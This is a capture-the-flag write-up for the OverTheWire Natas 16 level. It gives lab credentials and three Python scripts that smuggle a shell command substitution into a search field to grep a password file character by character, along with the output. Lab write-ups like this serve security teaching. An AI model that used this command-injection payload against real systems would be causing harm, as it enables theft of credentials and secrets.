# [Level 15 to 16](https://overthewire.org/wargames/natas/natas16.html)

- Login
```
URL: http://natas16.natas.labs.overthewire.org
Username: natas16
Password: hPkjKYviLQctEW33QmuXL6eDVfMW4sGo
```
- Exercise:
  - ![image](https://github.com/user-attachments/assets/b87d0948-ffda-4d57-b1f9-bc112973b631)
  - ![image](https://github.com/user-attachments/assets/fcbd0cdd-2a78-44c0-9c66-95add35b1b62)
- Background:
- Solution:
  - python script to find valid characters:
  ```python
  import requests
  import string
  from requests.auth import HTTPBasicAuth
  
  basicAuth=HTTPBasicAuth('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')
  
  u="http://natas16.natas.labs.overthewire.org/"
  
  VALID_CHARS = string.digits + string.ascii_letters
  
  matchingChars = ""
  
  for c in VALID_CHARS:
      payload = "$(grep " + c + " /etc/natas_webpass/natas17)zigzag"
      url = u + "?needle=" + payload + "&submit=Search"
  
      response = requests.get(url, auth=basicAuth, verify=False)
  
      if 'zigzag' not in response.text:
          print("Found a valid char : %s" % c)
          matchingChars += c
  
  print("Matching chars: ", matchingChars)
  ```
  - Output:
  ```bash
  Found a valid char : 0
  Found a valid char : 5
  Found a valid char : 7
  Found a valid char : 8
  Found a valid char : 9
  Found a valid char : b
  Found a valid char : h
  Found a valid char : j
  Found a valid char : k
  Found a valid char : o
  Found a valid char : q
  Found a valid char : s
  Found a valid char : v
  Found a valid char : w
  Found a valid char : C
  Found a valid char : E
  Found a valid char : F
  Found a valid char : H
  Found a valid char : J
  Found a valid char : L
  Found a valid char : N
  Found a valid char : O
  Found a valid char : T
  Matching chars:  05789bhjkoqsvwCEFHJLNOT
  ```
  - python script to iterate through the matching chars:
  ```python
  import requests
  import string
  from requests.auth import HTTPBasicAuth
  
  basicAuth=HTTPBasicAuth('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')
  u="http://natas16.natas.labs.overthewire.org/"
  
  PASSWORD_LENGTH = 32  # previous passwords were 32 chars long
  matchingChars = "05789bhjkoqsvwCEFHJLNOT"
  password="" # start with blank password
  
  while True:
      for c in matchingChars:
          payload = "$(grep " + password + c + " /etc/natas_webpass/natas17)zigzag"
  
          url = u + "?needle=" + payload + "&submit=Search"
  
          print(url)
  
          response = requests.get(url, auth=basicAuth, verify=False)
  
          if 'zigzag' not in response.text:
              print("Found a valid char : %s" % (password+c))
              password += c
  ```
  - python script to iterate through each of the valid chars and doing a POST request
  ```python
  import requests
  import string
  import time
  from requests.auth import HTTPBasicAuth
  
  basicAuth = HTTPBasicAuth('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')
  u = "http://natas16.natas.labs.overthewire.org/"
  
  PASSWORD_LENGTH = 32
  matchingChars = "05789bhjkoqsvwCEFHJLNOT"
  password = ""
  request_count = 0
  
  while len(password) < PASSWORD_LENGTH:
      for c in matchingChars:
          attempt = password + c
          payload = '$(grep ^' + attempt + ' /etc/natas_webpass/natas17)zigzag'
          url = u + "?needle=" + payload + "&submit=Search"
  
          response = requests.get(url, auth=basicAuth, verify=False)
          request_count += 1
  
          # Print every 50 requests
          if request_count % 50 == 0:
              print(f"Request #{request_count} | Current password prefix: {password}")
  
          if 'zigzag' not in response.text:
              password += c
              print(f"Found next char: {password}")
              break  # Go back to the top of while loop
  
  print(f"Password found: {password}")
  ```
  - Output:
  ```bash
  Found next char: E
  Found next char: Eq
  Found next char: Eqj
  Request #50 | Current password prefix: Eqj
  Found next char: EqjH
  Found next char: EqjHJ
  Found next char: EqjHJb
  Found next char: EqjHJbo
  Found next char: EqjHJbo7
  Request #100 | Current password prefix: EqjHJbo7
  Found next char: EqjHJbo7L
  Found next char: EqjHJbo7LF
  Found next char: EqjHJbo7LFN
  Request #150 | Current password prefix: EqjHJbo7LFN
  Found next char: EqjHJbo7LFNb
  Found next char: EqjHJbo7LFNb8
  Found next char: EqjHJbo7LFNb8v
  Found next char: EqjHJbo7LFNb8vw
  Found next char: EqjHJbo7LFNb8vwh
  Request #200 | Current password prefix: EqjHJbo7LFNb8vwh
  Found next char: EqjHJbo7LFNb8vwhH
  Found next char: EqjHJbo7LFNb8vwhHb
  Found next char: EqjHJbo7LFNb8vwhHb9
  Found next char: EqjHJbo7LFNb8vwhHb9s
  Found next char: EqjHJbo7LFNb8vwhHb9s7
  Found next char: EqjHJbo7LFNb8vwhHb9s75
  Found next char: EqjHJbo7LFNb8vwhHb9s75h
  Request #250 | Current password prefix: EqjHJbo7LFNb8vwhHb9s75h
  Found next char: EqjHJbo7LFNb8vwhHb9s75ho
  Found next char: EqjHJbo7LFNb8vwhHb9s75hok
  Found next char: EqjHJbo7LFNb8vwhHb9s75hokh
  Found next char: EqjHJbo7LFNb8vwhHb9s75hokh5
  Found next char: EqjHJbo7LFNb8vwhHb9s75hokh5T
  Request #300 | Current password prefix: EqjHJbo7LFNb8vwhHb9s75hokh5T
  Found next char: EqjHJbo7LFNb8vwhHb9s75hokh5TF
  Found next char: EqjHJbo7LFNb8vwhHb9s75hokh5TF0
  Found next char: EqjHJbo7LFNb8vwhHb9s75hokh5TF0O
  Request #350 | Current password prefix: EqjHJbo7LFNb8vwhHb9s75hokh5TF0O
  Found next char: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
  Password found: EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
  ```
- Password: `EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC`
